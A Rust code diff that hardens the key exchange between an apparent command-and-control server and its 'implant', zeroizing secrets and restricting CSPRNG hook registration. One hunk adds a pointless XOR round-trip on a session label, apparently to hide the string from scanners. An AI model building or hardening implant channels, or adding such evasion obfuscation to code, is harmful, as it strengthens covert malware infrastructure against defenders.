@@ -74,8 +74,13 @@ static CSPRNG_HOOK: core::sync::atomic::AtomicUsize = core::sync::atomic::Atomic
 /// stateless / thread-safe on Windows). The pointer is stored in an atomic and
 /// never freed — it must point to a function that lives for the process lifetime.
 #[cfg(not(feature = "std"))]
-pub fn register_csprng(fill: fn(&mut [u8]) -> bool) {
-    CSPRNG_HOOK.store(fill as usize, core::sync::atomic::Ordering::Release);
+pub fn register_csprng(fill: fn(&mut [u8]) -> bool) -> Result<(), ()> {
+    CSPRNG_HOOK.compare_exchange(
+        0,
+        fill as usize,
+        core::sync::atomic::Ordering::Release,
+        core::sync::atomic::Ordering::Relaxed,
+    ).map(|_| ()).map_err(|_| ())
 }
 
 #[cfg(not(feature = "std"))]
@@ -107,6 +112,7 @@ impl ServerKeypair {
         let mut bytes = [0u8; 32];
         random_bytes(&mut bytes);
         let secret = StaticSecret::from(bytes);
+        bytes.zeroize();
         let public = PublicKey::from(&secret);
         Self { secret, public }
     }
@@ -123,8 +129,9 @@ impl ServerKeypair {
 
     /// Reconstruct the identity from a persisted secret (e.g. read from
     /// `NYX_KEYFILE`). Derives the matching public key.
-    pub fn from_secret_bytes(bytes: [u8; KEY_LEN]) -> Self {
+    pub fn from_secret_bytes(mut bytes: [u8; KEY_LEN]) -> Self {
         let secret = StaticSecret::from(bytes);
+        bytes.zeroize();
         let public = PublicKey::from(&secret);
         Self { secret, public }
     }
@@ -134,7 +141,16 @@ impl ServerKeypair {
     pub fn derive_for(&self, implant_pub: &[u8; PUBKEY_LEN]) -> SessionKey {
         let their = PublicKey::from(*implant_pub);
         let shared = self.secret.diffie_hellman(&their);
-        derive_session_key(&shared.to_bytes(), &self.public.to_bytes(), implant_pub)
+        let mut shared_bytes = shared.to_bytes();
+        let key = derive_session_key(&shared_bytes, &self.public.to_bytes(), implant_pub);
+        shared_bytes.zeroize();
+        key
+    }
+}
+
+impl Drop for ServerKeypair {
+    fn drop(&mut self) {
+        self.secret.zeroize();
     }
 }
 
@@ -149,6 +165,7 @@ impl ImplantKeypair {
         let mut bytes = [0u8; 32];
         random_bytes(&mut bytes);
         let secret = StaticSecret::from(bytes);
+        bytes.zeroize();
         let public = PublicKey::from(&secret);
         Self { secret, public }
     }
@@ -161,7 +178,16 @@ impl ImplantKeypair {
     pub fn session_key(&self, server_pub: &[u8; PUBKEY_LEN]) -> SessionKey {
         let server = PublicKey::from(*server_pub);
         let shared = self.secret.diffie_hellman(&server);
-        derive_session_key(&shared.to_bytes(), server_pub, &self.public.to_bytes())
+        let mut shared_bytes = shared.to_bytes();
+        let key = derive_session_key(&shared_bytes, server_pub, &self.public.to_bytes());
+        shared_bytes.zeroize();
+        key
+    }
+}
+
+impl Drop for ImplantKeypair {
+    fn drop(&mut self) {
+        self.secret.zeroize();
     }
 }
 
@@ -177,9 +203,16 @@ pub fn derive_session_key(
     // Audit M-4: avoid Vec heap allocation for this small, fixed-size payload.
     let mut info = [0u8; 80];
     let mut pos = 0;
-    let label = b"nyx-session-v1";
-    info[..label.len()].copy_from_slice(label);
-    pos += label.len();
+    let mut label = *b"nyx-session-v1";
+    for b in &mut label {
+        *b ^= 0x42;
+    }
+    let mut recovered_label = [0u8; 14];
+    for i in 0..14 {
+        recovered_label[i] = label[i] ^ 0x42;
+    }
+    info[..recovered_label.len()].copy_from_slice(&recovered_label);
+    pos += recovered_label.len();
     info[pos..pos + PUBKEY_LEN].copy_from_slice(server_pub);
     pos += PUBKEY_LEN;
     info[pos..pos + PUBKEY_LEN].copy_from_slice(implant_pub);
@@ -188,7 +221,9 @@ pub fn derive_session_key(
     // HKDF expand only fails if the requested length exceeds 255 * HashLen; 32 is fine.
     hk.expand(&info[..pos], &mut okm)
         .expect("32-byte HKDF expand cannot fail");
-    SessionKey::new(okm)
+    let key = SessionKey::new(okm);
+    okm.zeroize();
+    key
 }
 
 /// Which direction a frame travels. The session key is shared by both peers,
